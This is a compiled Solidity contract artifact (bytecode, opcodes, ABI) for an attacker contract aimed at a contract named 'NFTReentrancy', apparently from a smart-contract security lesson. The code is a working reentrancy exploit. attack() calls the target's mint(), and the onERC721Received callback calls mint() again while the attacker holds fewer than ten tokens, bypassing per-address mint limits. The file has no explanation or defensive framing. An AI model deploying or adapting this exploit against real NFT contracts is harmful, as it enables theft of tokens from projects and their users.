{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561000f575f5ffd5b50604051610746380380610746833981810160405281019061003191906100e5565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610110565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b5f6100b482610099565b9050919050565b6100c4816100aa565b81146100ce575f5ffd5b50565b5f815190506100df816100bb565b92915050565b5f602082840312156100fa576100f9610076565b5b5f610107848285016100d1565b91505092915050565b6106298061011d5f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c8063150b7a021461004357806347ccca02146100735780639e5faafc14610091575b5f5ffd5b61005d60048036038101906100589190610445565b61009b565b60405161006a91906104ff565b60405180910390f35b61007b6101ca565b6040516100889190610573565b60405180910390f35b6100996101ee565b005b5f600a5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016100f7919061059b565b602060405180830381865afa158015610112573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013691906105c8565b10156101b8575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631249c58b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156101a1575f5ffd5b505af11580156101b3573d5f5f3e3d5ffd5b505050505b63150b7a0260e01b9050949350505050565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631249c58b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610253575f5ffd5b505af1158015610265573d5f5f3e3d5ffd5b50505050565b5f604051905090565b5f5ffd5b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6102a58261027c565b9050919050565b6102b58161029b565b81146102bf575f5ffd5b50565b5f813590506102d0816102ac565b92915050565b5f819050919050565b6102e8816102d6565b81146102f2575f5ffd5b50565b5f81359050610303816102df565b92915050565b5f5ffd5b5f5ffd5b5f601f19601f8301169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b61035782610311565b810181811067ffffffffffffffff8211171561037657610375610321565b5b80604052505050565b5f61038861026b565b9050610394828261034e565b919050565b5f67ffffffffffffffff8211156103b3576103b2610321565b5b6103bc82610311565b9050602081019050919050565b828183375f83830152505050565b5f6103e96103e484610399565b61037f565b9050828152602081018484840111156104055761040461030d565b5b6104108482856103c9565b509392505050565b5f82601f83011261042c5761042b610309565b5b813561043c8482602086016103d7565b91505092915050565b5f5f5f5f6080858703121561045d5761045c610274565b5b5f61046a878288016102c2565b945050602061047b878288016102c2565b935050604061048c878288016102f5565b925050606085013567ffffffffffffffff8111156104ad576104ac610278565b5b6104b987828801610418565b91505092959194509250565b5f7fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b6104f9816104c5565b82525050565b5f6020820190506105125f8301846104f0565b92915050565b5f819050919050565b5f61053b6105366105318461027c565b610518565b61027c565b9050919050565b5f61054c82610521565b9050919050565b5f61055d82610542565b9050919050565b61056d81610553565b82525050565b5f6020820190506105865f830184610564565b92915050565b6105958161029b565b82525050565b5f6020820190506105ae5f83018461058c565b92915050565b5f815190506105c2816102df565b92915050565b5f602082840312156105dd576105dc610274565b5b5f6105ea848285016105b4565b9150509291505056fea2646970667358221220c29b993389b85dab6b3c5d5c6cd08991d7920e7b73efea9248a413cf8f0fb2b764736f6c63430008220033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x746 CODESIZE SUB DUP1 PUSH2 0x746 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xE5 JUMP JUMPDEST DUP1 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x110 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xB4 DUP3 PUSH2 0x99 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xC4 DUP2 PUSH2 0xAA JUMP JUMPDEST DUP2 EQ PUSH2 0xCE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xDF DUP2 PUSH2 0xBB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xFA JUMPI PUSH2 0xF9 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x107 DUP5 DUP3 DUP6 ADD PUSH2 0xD1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x629 DUP1 PUSH2 0x11D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x3F JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x150B7A02 EQ PUSH2 0x43 JUMPI DUP1 PUSH4 0x47CCCA02 EQ PUSH2 0x73 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x91 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x5D PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x58 SWAP2 SWAP1 PUSH2 0x445 JUMP JUMPDEST PUSH2 0x9B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6A SWAP2 SWAP1 PUSH2 0x4FF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x7B PUSH2 0x1CA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x88 SWAP2 SWAP1 PUSH2 0x573 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x99 PUSH2 0x1EE JUMP JUMPDEST STOP JUMPDEST PUSH0 PUSH1 0xA PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xF7 SWAP2 SWAP1 PUSH2 0x59B JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x112 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x136 SWAP2 SWAP1 PUSH2 0x5C8 JUMP JUMPDEST LT ISZERO PUSH2 0x1B8 JUMPI PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1249C58B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1A1 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1B3 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH4 0x150B7A02 PUSH1 0xE0 SHL SWAP1 POP SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1249C58B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x253 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x265 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x2A5 DUP3 PUSH2 0x27C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2B5 DUP2 PUSH2 0x29B JUMP JUMPDEST DUP2 EQ PUSH2 0x2BF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2D0 DUP2 PUSH2 0x2AC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2E8 DUP2 PUSH2 0x2D6 JUMP JUMPDEST DUP2 EQ PUSH2 0x2F2 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x303 DUP2 PUSH2 0x2DF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH2 0x357 DUP3 PUSH2 0x311 JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0x376 JUMPI PUSH2 0x375 PUSH2 0x321 JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH2 0x388 PUSH2 0x26B JUMP JUMPDEST SWAP1 POP PUSH2 0x394 DUP3 DUP3 PUSH2 0x34E JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH2 0x3B3 JUMPI PUSH2 0x3B2 PUSH2 0x321 JUMP JUMPDEST JUMPDEST PUSH2 0x3BC DUP3 PUSH2 0x311 JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP3 DUP2 DUP4 CALLDATACOPY PUSH0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH2 0x3E9 PUSH2 0x3E4 DUP5 PUSH2 0x399 JUMP JUMPDEST PUSH2 0x37F JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH2 0x405 JUMPI PUSH2 0x404 PUSH2 0x30D JUMP JUMPDEST JUMPDEST PUSH2 0x410 DUP5 DUP3 DUP6 PUSH2 0x3C9 JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x42C JUMPI PUSH2 0x42B PUSH2 0x309 JUMP JUMPDEST JUMPDEST DUP2 CALLDATALOAD PUSH2 0x43C DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH2 0x3D7 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 PUSH0 PUSH0 PUSH1 0x80 DUP6 DUP8 SUB SLT ISZERO PUSH2 0x45D JUMPI PUSH2 0x45C PUSH2 0x274 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x46A DUP8 DUP3 DUP9 ADD PUSH2 0x2C2 JUMP JUMPDEST SWAP5 POP POP PUSH1 0x20 PUSH2 0x47B DUP8 DUP3 DUP9 ADD PUSH2 0x2C2 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x40 PUSH2 0x48C DUP8 DUP3 DUP9 ADD PUSH2 0x2F5 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x60 DUP6 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x4AD JUMPI PUSH2 0x4AC PUSH2 0x278 JUMP JUMPDEST JUMPDEST PUSH2 0x4B9 DUP8 DUP3 DUP9 ADD PUSH2 0x418 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP6 SWAP2 SWAP5 POP SWAP3 POP JUMP JUMPDEST PUSH0 PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4F9 DUP2 PUSH2 0x4C5 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x512 PUSH0 DUP4 ADD DUP5 PUSH2 0x4F0 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x53B PUSH2 0x536 PUSH2 0x531 DUP5 PUSH2 0x27C JUMP JUMPDEST PUSH2 0x518 JUMP JUMPDEST PUSH2 0x27C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x54C DUP3 PUSH2 0x521 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x55D DUP3 PUSH2 0x542 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x56D DUP2 PUSH2 0x553 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x586 PUSH0 DUP4 ADD DUP5 PUSH2 0x564 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x595 DUP2 PUSH2 0x29B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x5AE PUSH0 DUP4 ADD DUP5 PUSH2 0x58C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x5C2 DUP2 PUSH2 0x2DF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x5DD JUMPI PUSH2 0x5DC PUSH2 0x274 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x5EA DUP5 DUP3 DUP6 ADD PUSH2 0x5B4 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC2 SWAP12 SWAP10 CALLER DUP10 0xB8 TSTORE 0xAB PUSH12 0x3C5D5C6CD08991D7920E7B73 0xEF 0xEA SWAP3 BASEFEE LOG4 SGT 0xCF DUP16 0xF 0xB2 0xB7 PUSH5 0x736F6C6343 STOP ADDMOD 0x22 STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "315400",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"attack()": "infinite",
				"nft()": "infinite",
				"onERC721Received(address,address,uint256,bytes)": "infinite"
			}
		},
		"methodIdentifiers": {
			"attack()": "9e5faafc",
			"nft()": "47ccca02",
			"onERC721Received(address,address,uint256,bytes)": "150b7a02"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "contract NFTReentrancy",
					"name": "_nftAddr",
					"type": "address"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"inputs": [],
			"name": "attack",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "nft",
			"outputs": [
				{
					"internalType": "contract NFTReentrancy",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "",
					"type": "address"
				},
				{
					"internalType": "address",
					"name": "",
					"type": "address"
				},
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				},
				{
					"internalType": "bytes",
					"name": "",
					"type": "bytes"
				}
			],
			"name": "onERC721Received",
			"outputs": [
				{
					"internalType": "bytes4",
					"name": "",
					"type": "bytes4"
				}
			],
			"stateMutability": "nonpayable",
			"type": "function"
		}
	]
}